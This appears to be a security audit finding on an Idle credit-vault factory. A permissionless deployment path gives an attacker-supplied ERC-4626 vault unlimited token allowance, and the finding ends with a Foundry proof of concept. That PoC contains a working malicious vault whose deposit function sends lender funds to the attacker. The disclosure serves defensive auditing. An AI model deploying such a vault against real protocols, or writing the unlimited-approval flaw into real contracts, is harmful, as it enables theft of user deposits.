### Title
Unvalidated ERC-4626 vault receives unlimited approval and can steal all programmable-borrower deposits - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary

`deployRevolvingCreditVault` is permissionless and accepts `programmableBorrowerParams.vault` directly from the caller. [1](#0-0)  During `ProgrammableBorrower.initialize`, the only substantive validation is that `IERC4626(_vault).asset()` equals the CDO underlying, after which the borrower proxy grants the supplied vault unlimited underlying-token allowance. [2](#0-1)  A malicious ERC-4626-compatible contract can therefore drain assets whenever the programmable borrower holds underlying.

### Finding Description

The revolving-vault factory path does not authenticate the deployer or restrict the ERC-4626 vault to an approved registry; it only checks fee parameters and a nonzero manager before deploying the programmable borrower. [3](#0-2)  `_deployProgrammableBorrower` forwards the attacker-selected `programmableBorrowerParams.vault` to `ProgrammableBorrower.initialize`. [4](#0-3)  The initializer rejects a zero or wrong-asset vault, but any malicious contract that reports the correct `asset()` passes and receives `type(uint256).max` underlying allowance. [5](#0-4) 

The invariant violated is trusted-integration isolation: an address supplied as a deployment parameter is treated as a trusted vault and receives unrestricted spending authority over lender funds. [6](#0-5) 

### Impact Explanation

A lender deposit first moves underlying into the CDO and strategy through `_deposit`. [7](#0-6)  When the honest manager later calls `startEpoch`, the CDO sends available underlying to the configured borrower and invokes `onStartEpoch` for a programmable borrower. [8](#0-7)  `onStartEpoch` then deposits the programmable borrower’s full underlying balance into the attacker-controlled vault. [9](#0-8)  `_depositToVault` calls `vault.deposit`, so the malicious vault can transfer the entire amount to the attacker while still minting apparently valid shares. [10](#0-9) 

The quantified loss is the full underlying balance passed to `vault.deposit`, which includes all idle lender deposits sent to the programmable borrower at epoch start, less only any separately reserved pending withdrawals. [11](#0-10)  Lenders retain tranche tokens, but their backing has been removed, producing direct theft and insolvency rather than an ordinary market loss.

### Likelihood Explanation

The attacker needs no owner, manager, guardian, borrower, queue, or Keyring privileges: deployment is externally callable, and the malicious contract only has to expose a compatible ERC-4626 interface and return the selected underlying from `asset()`. [12](#0-11) [13](#0-12)  The exploit does require the resulting vault to attract a lender deposit and an honest manager to start an epoch, but neither actor needs to be malicious or compromised. [14](#0-13) 

Existing checks do not prevent the attack: the CDO-token comparison validates only the reported asset, while the unlimited approval is granted before any behavioral or registry validation. [15](#0-14)  `setVault` has the same insufficient `asset()` check, although exploiting initialization through the factory does not require any privileged role. [16](#0-15) 

### Recommendation

Restrict programmable-borrower vault selection to a treasury-controlled registry of reviewed ERC-4626 vaults, rather than accepting arbitrary addresses in the public factory path. [17](#0-16)  Additionally, avoid standing unlimited approvals: approve only the exact deposit amount for each `_depositToVault` call and reset the allowance after the call. [10](#0-9)  The `setVault` path should enforce the same registry validation and should not be able to point the borrower at an unreviewed contract merely because `asset()` matches. [16](#0-15) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {ProgrammableBorrower} from
  "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract Asset is ERC20 {
  constructor() ERC20("USDC", "USDC") {}

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract MaliciousERC4626 is ERC20 {
  Asset public immutable assetToken;
  address public immutable attacker;

  constructor(Asset asset_, address attacker_)
    ERC20("Malicious Vault Share", "evilSHARE")
  {
    assetToken = asset_;
    attacker = attacker_;
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256)
  {
    // The approval granted by ProgrammableBorrower.initialize makes this succeed.
    assetToken.transferFrom(msg.sender, attacker, assets);
    _mint(receiver, assets);
    return assets;
  }

  function convertToAssets(uint256 shares) external pure returns (uint256) {
    return shares;
  }

  function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256)
  {
    _burn(owner, assets);
    assetToken.transfer(receiver, assets);
    return assets;
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256)
  {
    _burn(owner, shares);
    assetToken.transfer(receiver, shares);
    return shares;
  }
}

contract MaliciousFactoryVaultPoC is Test {
  bytes32 internal constant DEPLOYED =
    keccak256(
      "CreditVaultDeployed(address,address,address,address,address,address)"
    );

  function testUnvalidatedVaultDrainsEpochDeposit() external {
    address treasury = makeAddr("treasury");
    address proxyAdmin = makeAddr("proxyAdmin");
    address factoryAdmin = makeAddr("factoryAdmin");
    address manager = makeAddr("honestManager");
    address realBorrower = makeAddr("honestBorrower");
    address lender = makeAddr("lender");
    address attacker = makeAddr("attacker");

    Asset asset = new Asset();
    MaliciousERC4626 maliciousVault =
      new MaliciousERC4626(asset, attacker);

    IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
    IdleCreditVaultFactory factory = IdleCreditVaultFactory(
      address(
        new TransparentUpgradeableProxy(
          address(factoryImpl),
          factoryAdmin,
          abi.encodeWithSelector(
            IdleCreditVaultFactory.initialize.selector,
            treasury,
            proxyAdmin
          )
        )
      )
    );

    IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
    IdleCreditVault strategyImpl = new IdleCreditVault();
    ProgrammableBorrower borrowerImpl = new ProgrammableBorrower();

    IdleCreditVaultFactory.CreditVaultParams memory cvParams =
      IdleCreditVaultFactory.CreditVaultParams({
        implementation: address(cdoImpl),
        limit: 0,
        underlying: address(asset),
        apr: 0,
        epochDuration: 30 days,
        bufferPeriod: 0,
        instantWithdrawDelay: 0,
        instantWithdrawAprDelta: 0,
        disableInstantWithdraw: true,
        keyringPolicy: 0,
        feeReceiver: makeAddr("feeReceiver"),
        fees: 5_000,
        managementFee: 500,
        isInterestMinted: true,
        isDepositDuringEpochDisabled: true
      });

    IdleCreditVaultFactory.StrategyData memory strategyData =
      IdleCreditVaultFactory.StrategyData({
        implementation: address(strategyImpl),
        manager: manager,
        borrower: realBorrower,
        borrowerName: "Borrower"
      });

    IdleCreditVaultFactory.ProgrammableBorrowerParams memory pbParams =
      IdleCreditVaultFactory.ProgrammableBorrowerParams({
        implementation: address(borrowerImpl),
        vault: address(maliciousVault),
        borrower: realBorrower,
        borrowerApr: 0
      });

    IdleCreditVaultFactory.AncillaryParams memory ancillary =
      IdleCreditVaultFactory.AncillaryParams({
        keyring: address(0),
        queueImplementation: address(0),
        prefundedDepositWindow: 0,
        writeOffImplementation: address(0)
      });

    vm.recordLogs();
    vm.prank(attacker);
    factory.deployRevolvingCreditVault(cvParams, strategyData, pbParams, ancillary);

    Vm.Log[] memory logs = vm.getRecordedLogs();
    address cdo;
    address programmableBorrower;

    for (uint256 i; i < logs.length; ++i) {
      if (logs[i].topics[0] == DEPLOYED) {
        (cdo,,,programmableBorrower,,) =
          abi.decode(
            logs[i].data,
            (address,address,address,address,address,address)
          );
      }
    }

    uint256 depositAmount = 1_000_000e18;
    asset.mint(lender, depositAmount);

    vm.startPrank(lender);
    asset.approve(cdo, depositAmount);
    IdleCDOEpochVariant(cdo).depositAA(depositAmount);
    vm.stopPrank();

    vm.prank(manager);
    IdleCDOEpochVariant(cdo).startEpoch();

    assertEq(asset.balanceOf(attacker), depositAmount);
    assertEq(asset.balanceOf(programmableBorrower), 0);
    assertEq(maliciousVault.balanceOf(programmableBorrower), depositAmount);
  }
}
```

### Citations

**File:** contracts/IdleCreditVaultFactory.sol (L85-90)
```text
  struct ProgrammableBorrowerParams {
    address implementation;
    address vault;
    address borrower;
    uint256 borrowerApr;
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L126-150)
```text
  function deployRevolvingCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    ProgrammableBorrowerParams memory programmableBorrowerParams,
    AncillaryParams memory ancillaryParams
  ) external {
    if (ancillaryParams.writeOffImplementation != address(0)) revert WriteOffUnsupported();
    _checkMinimumFees(cvParams);
    address manager = strategyData.manager;
    if (manager == address(0)) revert Is0();

    cvParams.apr = 0;
    cvParams.isInterestMinted = true;
    cvParams.disableInstantWithdraw = true;
    cvParams.isDepositDuringEpochDisabled = true;
    (IdleCDOEpochVariant cv, IdleCreditVault strategy) = _deployBaseCreditVault(strategyData, cvParams);
    address keyringWhitelist = _deployKeyring(ancillaryParams);
    _configureCreditVault(cv, strategy, cvParams, keyringWhitelist, manager);

    ProgrammableBorrower programmableBorrower = _deployProgrammableBorrower(
      programmableBorrowerParams,
      cv,
      strategy,
      manager
    );
```

**File:** contracts/IdleCreditVaultFactory.sol (L216-226)
```text
    programmableBorrower = ProgrammableBorrower(_deployProxy(
      programmableBorrowerParams.implementation,
      abi.encodeWithSelector(
        ProgrammableBorrower.initialize.selector,
        programmableBorrowerParams.vault,
        address(cv),
        address(this),
        manager,
        programmableBorrowerParams.borrower,
        programmableBorrowerParams.borrowerApr
      )
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L108-134)
```text
  function initialize(
    address _vault, address _idleCDO, address _owner,
    address _manager, address _borrower, uint256 _borrowerApr
  ) external initializer {
    if (
      _vault == address(0) || _owner == address(0) || _manager == address(0) ||
      _borrower == address(0) || _idleCDO == address(0)
    ) {
      revert InvalidAddress();
    }
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L158-169)
```text
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L214-222)
```text
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L607-613)
```text
  /// @dev Set allowance for `_token` to unlimited for `_spender`.
  /// Both the vault and IdleCDO are trusted integrations, so the contract keeps a standing approval.
  /// @param _token token address
  /// @param _spender spender address
  function _allowUnlimitedSpend(address _token, address _spender) internal {
    IERC20Detailed(_token).safeIncreaseAllowance(_spender, type(uint256).max);
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L191-212)
```text
  function _deposit(uint256 _amount, address _tranche) internal virtual whenNotPaused returns (uint256 _minted) {
    if (_amount == 0) {
      return _minted;
    }
    // check that we are not depositing more than the contract available limit
    _guarded(_amount);
    // interest accrued since last depositXX/withdrawXX is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));

    // direct deposit in the strategy
    IIdleCDOStrategy(strategy).deposit(_amount);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L233-240)
```text
  function startEpoch() external {
    _checkOnlyOwnerOrManager();

    // Check that buffer period passed (and epoch is not running as epochEndDate is set)
    // and that the pool is not closed (ie epochDuration == 0)
    uint256 _epochDuration = epochDuration; 
    _checkNotAllowed(defaulted || block.timestamp < (epochEndDate + bufferPeriod) || _epochDuration == 0);
    _checkProgrammableBorrowerMode();
```

**File:** contracts/IdleCDOEpochVariant.sol (L270-303)
```text
    // transfer in this contract funds from interest payment (if any) and buffer deposits sent to the strategy
    uint256 _totEpochDeposits = _strategy.totEpochDeposits();
    // If interest is minted we do not transfer interest to the strategy
    uint256 _toSend = isInterestMinted ? _totEpochDeposits : lastEpochInterest + _totEpochDeposits;
    _strategy.sendInterestAndDeposits(_toSend);

    // we should first check if there are *instant* redeem requests pending 
    // and if yes we should send as much underlyings as possible to the IdleCreditVault contract
    // if there is any surplus then we send those to the borrower
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
      // The borrower did not receive the funds, so keep the strategy-token backing in the strategy.
      _transferUnderlyings(address(_strategy), _toBorrower);
      _strategy.reserveDefaultRecovery(_toBorrower);
      _handleBorrowerDefault(_toBorrower);
    }
```
